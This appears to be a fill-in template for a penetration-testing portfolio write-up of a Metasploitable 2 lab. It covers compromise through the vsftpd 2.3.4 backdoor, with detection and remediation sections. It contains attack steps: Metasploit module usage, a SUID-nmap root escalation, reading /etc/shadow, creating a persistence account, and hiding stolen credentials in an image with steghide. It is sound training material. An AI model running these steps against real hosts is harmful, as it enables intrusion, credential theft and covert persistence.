---
layout: page
title: "Metasploitable 2 — Full Compromise via vsftpd Backdoor"
platform: Metasploitable 2
skills: [Enumeration, Vulnerability Identification, Payload Selection, Privilege Escalation, Log Analysis/Detection, Reporting]
date: 2026-11-11
writeup: true
---

> Scaffold for the Metasploitable 2 exploitation lab, and the pattern every write-up on this site follows: the section order moves a reader from *what you found* to *why it matters* to *what to do about it*. Replace every `[FILL IN: ...]` with your own commands, output and screenshots from your own run. Don't write up a finding you didn't confirm — where the VM is *built* to contain something (an unauthenticated backdoor, world-readable hashes), prove it with your own evidence before you state it as fact.

## Overview

This engagement takes a single intentionally vulnerable host from first contact to full root compromise, then through post-exploitation: enumeration of sensitive data, a persistence account, and exfiltration hidden inside an image. The point isn't the trophy — one clean path to root is enough — it's demonstrating the full kill chain end to end and being able to argue *why* each choice was made.

- **Target:** [FILL IN: Metasploitable 2 — 192.168.56.x]
- **Attack host:** [FILL IN: Kali 2026.x — 192.168.56.x]
- **Network:** [FILL IN: isolated VirtualBox host-only network, e.g. 192.168.56.0/24 — no route to the internet or any third party during offensive activity]
- **Scope / goal:** root on the target via a confirmed unauthenticated path, then post-exploitation (data enumeration, persistence, exfiltration)
- **Dates:** [FILL IN]

Both VMs are owned by me and confined to a host-only network; Metasploitable 2 is a purpose-built training image. There is no authorisation ambiguity — see the note on scope and ethics at the end.

## Executive Summary

[FILL IN: 3–5 sentences an audit lead or manager could act on, no jargon that needs a footnote. Lead with the risk. Something like: "The target was fully compromised within minutes by an unauthenticated attacker with no prior credentials, via a backdoored FTP service (CVE-2011-2523). The resulting shell ran as root, so no privilege escalation was needed — every account hash, configuration file and business document on the host was immediately exposed. The single most important fix is to remove the backdoored service and bring the host onto a patch-management cadence." Adjust to what you actually observed.]

## Enumeration

Discovery and service mapping. Go service by service — the **version string** is what drives every downstream decision, so capture it deliberately rather than pasting one giant scan and moving on.

**Host discovery**

```
[FILL IN: nmap -sn 192.168.56.0/24]
```
→ [FILL IN: confirmed target IP; cross-check against `ifconfig` on the Metasploitable console]

**Full port / service / OS sweep**

```
[FILL IN: sudo nmap -sS -sV -O -p- --script=default -T4 -oN nmap_full.txt 192.168.56.x]
```
→ [FILL IN: record open ports with confirmed versions. The ones that matter for this path and the documented alternatives:]

| Port | Service | Version | Note |
|------|---------|---------|------|
| 21 | FTP | [FILL IN: vsftpd 2.3.4] | Known backdoor; anonymous login allowed |
| 139/445 | SMB | [FILL IN: Samba 3.0.20] | `usermap_script` RCE candidate |
| 3306 | MySQL | [FILL IN: 5.0.51a] | Default/blank root password candidate |
| 3632 | distccd | [FILL IN: v1] | Unauthenticated RCE candidate |
| 6667 | IRC | [FILL IN: UnrealIRCd] | Backdoor candidate |

> 📸 **Screenshots to capture:** the `nmap -sn` host-discovery output; the full scan completing with the open-port table visible; the banner line showing the FTP version.

**Vulnerability scan (confirmation)**

```
[FILL IN: nmap --script vuln 192.168.56.x]
```
→ [FILL IN: the NSE leads worth chasing]

[FILL IN: if you ran Greenbone/GVM as a GUI confirmation scanner, note it here and screenshot the finished report with the High/Critical findings table. Where a scanner returned nothing directly, cross-reference the Phase-2 version strings against NVD/CVE.org manually — a standard, defensible technique — and say so.]

> 📸 **Screenshots to capture:** the GVM task at "Done" with the severity bar; the Critical findings list.

## Vulnerability Identification

Turn the enumeration into a ranked list. For each finding, name the weakness, tie it to the evidence, and rate it on likelihood × impact — see the [Methodology]({{ '/methodology/' | relative_url }}) page for how the ratings are derived. CVSS is a useful anchor, but rate by *achievable impact on this host*, not scanner output alone.

| ID | Finding | CVE | Likelihood | Impact | Risk | Justification (likelihood × impact) |
|------|---------|-----|------------|--------|------|-------------------------------------|
| F-01 | vsftpd 2.3.4 backdoor | CVE-2011-2523 | [H] | [H] | **Critical** | [FILL IN: network-reachable, unauthenticated, trivially triggered, public module — High likelihood; spawns a shell already running as root — High impact → Critical.] |
| F-02 | Samba `usermap_script` RCE | CVE-2007-2447 | [L/M/H] | [H] | [FILL IN] | [FILL IN: alternative root path; rate it, then say why you didn't need it] |
| F-03 | MySQL blank root password | — (CWE-521) | [L/M/H] | [M/H] | [FILL IN] | [FILL IN: confidentiality breach of every DB] |
| F-04 | distccd unauth RCE | CVE-2004-2687 | [L/M/H] | [M/H] | [FILL IN] | [FILL IN: shell as daemon user, needs chaining to reach root] |
| F-05 | Cleartext services (Telnet/rsh) | — | [L/M/H] | [M] | [FILL IN] | [FILL IN: credential capture on a shared segment] |

## Exploitation

For the path you chose, show it end to end — module, configuration, proof — and **explain why you picked it over the alternatives**. The reasoning is what demonstrates skill; that it worked is not.

**Chosen path: vsftpd 2.3.4 backdoor (F-01).** Why this one over Samba, distcc or MySQL: it is unauthenticated, needs no privilege escalation (the daemon already runs as root), has the highest confidence of a clean single-shot compromise, and leaves a clear, teachable mechanism — the backdoor triggers on an FTP username containing `:)`, opening a root listener on TCP 6200.

```
[FILL IN:
 msfconsole
 search vsftpd
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.x
 show options
 exploit
]
```

→ [FILL IN: paste the "Backdoor has been spawned!" / session-opened lines and your proof-of-root:]

```
meterpreter > getuid      → [FILL IN: Server username: root]
meterpreter > sysinfo     → [FILL IN: OS / arch / hostname]
```

> 📸 **Screenshots to capture:** `show options` with RHOSTS set; the exploit firing and the session opening; `getuid` returning root; `sysinfo`. Include the timestamp visible in the console.

**Payload note.** This backdoor returns a direct root session, so there's no reverse-vs-bind shell decision here. Where a payload *is* selectable (the Samba path below), state the choice and the reasoning: a bind shell (`cmd/unix/bind_netcat`) needs no reachability back to the attacker, a reverse shell does — on a NAT'd or firewalled segment that choice decides whether the session ever connects.

**Documented alternative paths (not run — one clean compromise is sufficient).** Written up to show the attack surface was understood, not just the one door used:

- **Samba `usermap_script` (CVE-2007-2447):** [FILL IN: `use exploit/multi/samba/usermap_script`, set a `cmd/unix/reverse` or `bind_netcat` payload, confirm with `id`. Note the fallback: if no session, verify the option is enabled with `nmap -p139,445 --script smb-vuln*` first.]
- **MySQL blank root password:** [FILL IN: `auxiliary/scanner/mysql/mysql_login` with `BLANK_PASSWORDS true`, then `mysql -h <target> -u root`. Fallback if remote root is blocked: run `mysql -u root` locally from the root shell you already have, which bypasses host restrictions via the local socket.]
- **distccd (CVE-2004-2687):** [FILL IN: `use exploit/unix/misc/distcc_exec` — yields a shell as the distcc user, which would need chaining with a local privesc (e.g. the SUID-nmap technique below) to reach root.]

## Impact / Post-Exploitation

Framed as consequence, not trophies.

**Privilege level.** Root from the initial shell — no escalation step required, because the backdoored daemon already runs as root.

[FILL IN: if you want to *demonstrate* a privesc pattern from a low-privilege foothold anyway (a common assessment requirement), document the SUID-nmap path separately and label it clearly as a separate demonstration:]

```
[FILL IN:
 ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@192.168.56.x
 find / -perm -4000 2>/dev/null       # nmap appears in the SUID list
 nmap --interactive
   !sh                                 # shell inherits nmap's SUID-root context
 id                                    # euid=0(root)
]
```
> SUID (Set User ID) makes a binary run as its owner (root) regardless of who launched it; `nmap --interactive`'s shell-escape inherits that context. On newer builds that reject `--interactive`, use an alternate SUID binary from the `find` output (vim/find/python follow the same pattern).

**Sensitive data reachable.** From the root shell:

```
[FILL IN:
 cat /etc/passwd      # 30+ accounts — real users alongside service accounts
 cat /etc/shadow      # readable only as root — every password hash exposed
 cat /etc/crontab     # check for existing persistence
 ls -la /home/*/      # confidential business documents (e.g. payslips)
]
```
→ [FILL IN: what you found. Call out the hash scheme — `$1$` is weak MD5-crypt, `$5$`=SHA-256, `$6$`=SHA-512, `$y$`=yescrypt — because the scheme is what you'd recommend remediating toward.]

**Persistence.** A local account created to simulate maintained access:

```
[FILL IN:
 useradd -m -s /bin/bash <name>
 usermod -p $(openssl passwd -1 '<password>') <name>
 grep <name> /etc/passwd /etc/shadow
]
```
→ [FILL IN: confirm the account and its hash entry exist. This is exactly the kind of event a defender should be alerting on — carry it into Detection Evidence below.]

**Exfiltration via steganography.** An image sourced from the target's own web app, with sensitive data embedded inside it:

```
[FILL IN:
 steghide embed -cf <image> -ef creds.txt -sf hidden_creds.jpg
 steghide info hidden_creds.jpg
 steghide extract -sf hidden_creds.jpg      # prove the round-trip
]
```
> 📸 **Screenshots to capture:** `/etc/shadow` on screen as root; the `useradd`/`usermod` sequence and the resulting `/etc/passwd` + `/etc/shadow` lines; the full steghide embed → info → extract round-trip, with a timestamp.

**Consequence in one line.** [FILL IN: "Root on this host means every credential, configuration file and business document is readable, the host can be used as a pivot to the rest of the segment, and attacker access survives a reboot via the persistence account." Tailor to what you actually demonstrated.]

## Detection Evidence

The defender's half — the part most portfolios skip, so it's the part that sets yours apart. For each attacker action, name the artefact a blue team would see, and *where*. Capture it if you can; if you didn't, say precisely what you'd look for and why.

- **The scan:** [FILL IN: the full TCP connect/SYN sweep is noisy — in a packet capture it's a burst of SYNs to sequential ports from one source. What would fire in an IDS (e.g. a Snort portscan preprocessor alert)?]
- **The backdoor trigger:** [FILL IN: an FTP `USER` command containing `:)`, followed by a new connection to TCP 6200. In a pcap, filter `ftp` for the malicious username and `tcp.port == 6200` for the shell channel. Show the Follow-TCP-Stream.]
- **The root shell / commands:** [FILL IN: what `/var/log/auth.log` or process accounting would (or wouldn't) show. Note honestly if the backdoor path leaves little host-side log evidence — that *absence* is itself the finding.]
- **The persistence account:** [FILL IN: `useradd` writes to `/var/log/auth.log`; the new line in `/etc/passwd` and `/etc/shadow`. This is the highest-value detection — unauthorised account creation should be a standing alert. Screenshot the log line.]
- **The exfiltration:** [FILL IN: steganography is deliberately low-signal — the point is that a defender sees an ordinary image leaving the host. What egress control or DLP signal would catch it, and why is this hard?]

> 📸 **Screenshots to capture:** the Wireshark filter isolating the backdoor username; the TCP 6200 stream; the `auth.log` line for the new account.

## Recommendations

One concrete, actionable fix per finding, highest risk first. Say *what* to change, not "patch it".

| Finding | Fix |
|---------|-----|
| vsftpd 2.3.4 backdoor | [FILL IN: remove/replace with a current, officially-signed build; verify package checksums before install; restrict FTP to trusted networks or replace with SFTP] |
| Anonymous FTP | [FILL IN: disable anonymous access entirely] |
| Samba usermap_script | [FILL IN: patch Samba; disable `username map script`; enable SMB signing] |
| MySQL blank root | [FILL IN: set a strong unique password; restrict DB network access to app servers] |
| Cleartext services | [FILL IN: disable Telnet/rexec/rlogin/rsh; standardise on SSH] |
| Weak hashes (`$1$`) | [FILL IN: migrate to yescrypt/SHA-512; force a password reset] |
| General | [FILL IN: patch-management cadence; periodic vuln scans; segment legacy hosts; egress filtering + IDS; **alert on unauthorised account creation**] |

## Lessons Learned

Write this properly — it's often the first thing a reviewer reads to gauge how you think.

- **What worked:** [FILL IN: e.g. capturing version strings service-by-service during enumeration meant the exploit choice was already obvious before touching Metasploit.]
- **What was slow or clumsy:** [FILL IN: where you got stuck or did by hand something worth scripting.]
- **What you'd do differently:** [FILL IN: one concrete methodology change for the next target.]
- **The detection gap you noticed:** [FILL IN: the honest observation — e.g. the backdoor path left almost nothing in the host logs, but the persistence account was loud. What does that imply for where a blue team should invest?]
- **One thing you now understand that you didn't before:** [FILL IN: the actual learning, in a sentence — e.g. why "root RCE with no auth" outranks a higher-CVSS finding that needs a foothold first.]
